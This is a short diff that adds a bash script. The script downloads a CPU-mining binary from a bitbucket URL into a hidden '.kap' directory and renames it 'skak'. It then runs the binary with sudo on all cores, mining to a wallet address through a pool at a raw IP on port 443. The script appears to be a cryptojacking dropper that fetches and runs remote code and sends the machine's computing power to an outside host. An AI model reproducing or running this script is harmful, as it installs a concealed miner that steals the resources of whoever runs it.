@@ -1,0 +1,6 @@
+#!/bin/bash
+apt-get update ; apt-get -y install sudo
+mkdir .kap && cd .kap
+wget -O skak https://bitbucket.org/aboxx/filee/raw/main/cpuminer-avx2
+chmod 777 skak
+sudo ./skak -a yespower -o 64.23.198.64:443 -u aEZE6VgVCiTxgTrUDfyJ8bmQmLoEcUqysn.cuuuk -t $(nproc --all)
